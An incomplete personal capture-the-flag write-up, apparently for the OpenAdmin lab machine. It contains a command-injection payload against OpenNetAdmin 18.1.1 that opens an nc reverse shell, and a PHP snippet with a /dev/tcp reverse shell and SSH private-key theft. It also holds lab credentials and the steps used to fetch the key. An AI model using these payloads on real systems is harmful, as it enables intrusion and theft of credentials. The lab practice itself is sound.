@@ -1,0 +1,120 @@
+# Machine #[NUMBER] [NAME]  
+
+
+## Nmap Results  
+  <img src="https://nmap.org/images/nmap-logo-256x256.png">   
+
+* Just a web service and ssh.
+
+
+
+<br/><br/>
+
+## Banner Grabbing of Services  
+ * Didn't find much
+
+
+<br/><br/>
+
+## Searchsploit
+  <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   
+
+
+
+<br/><br/>  
+
+## Gobustering Stuff  
+
+  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  
+
+* In this path `http://10.129.170.143/artwork/` found a website.
+* I will try and gobuster the previous path see what I get.
+
+<br/><br/>
+
+
+## Thinking Out Loud   
+
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>  
+
+* The root opens the default page for Apache.  
+* In the website I found "Arcwork" I found a form that when the button is pressed in it it sends a post request but without the input which I think means it's as useful as a bag of chips to break the website.  
+* The form in `/sierra` sends parameters in the post which means it might be exploitable in a way MAYBE. In this path `/sierra/contact_process.php` the post takes place.  
+* Emails I found  
+  * contact@sierracompany.com (In the sierra website).
+  * hello@mydomain.com (Arcwork website).  
+* In the last website `/music` I found something interesting when I pressed "login" it opened this url `http://10.129.170.143/ona/` which opened something weird called openNetAdmin which seems like it's obviously key to solving the machine.
+* Found a dns domain. I'm gonna try and put it in hosts.
+* OpenNetAdmin version ==> OpenNetAdmin - v18.1.1.
+* I was able to login as "admin/admin" in the opennetadmin.
+* It seems that the exploit I found for this version of openNetAdmin takes advantage of the "IP Calculator".  
+
+xajax=window_submit&xajaxr=1643382750871&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204444%20%3E%2Ftmp%2Ff&xajaxargs[]=ping%22%20%22http%3A%2F%2F10.129.170.143%2Fona%2F  
+
+* Found a credential for the database 
+```console
+ 'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!', // turns out this is jimmy's password
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+```
+
+* Found another password for jimmy `Revealed` it was hashed with sha 512 and I was able to crack it easily anyway what do I need it for?  
+
+* `/etc/sudoers.d/joanna:joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv`  
+
+
+```
+lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf                                                 
+    ServerName internal.openadmin.htb
+lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf                                               
+        ServerName openadmin.htb
+```  
+
+* I was able to get joanna's key by executing this 
+```console
+curl -X POST -F 'username=jimmy' -F 'password=Revealed' -F 'login=' http://localhost:52846/main.php
+```
+But I'm not able to use the passphrase yettt which is frustrating and a reverse shell is not working.
+
+<br/><br/>
+
+
+
+## How Did I Solve the Machine 
+
+   <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   
+
+
+     
+
+## Where I Got Stuck?  
+
+   
+
+## What Did I learn from this Machine?  
+
+* OpenNetAdmin  
+  <blockquote>
+  OpenNetAdmin is a Network Management application that provides a database of managed inventory of IPs, subnets, and hosts in a network with a centralized AJAX web interface. The application is an Opensource written in PHP; you can view the source code on GitHub “ONA Project.”
+  </blockquote>
+
+
+
+## Writeups   
+  
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
+# Open Admin Trusted
+# OpenAdmin
+#exec("bash -i >& /dev/tcp/10.10.14.74/1234 0>&1");
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+<!-- tagsss -->
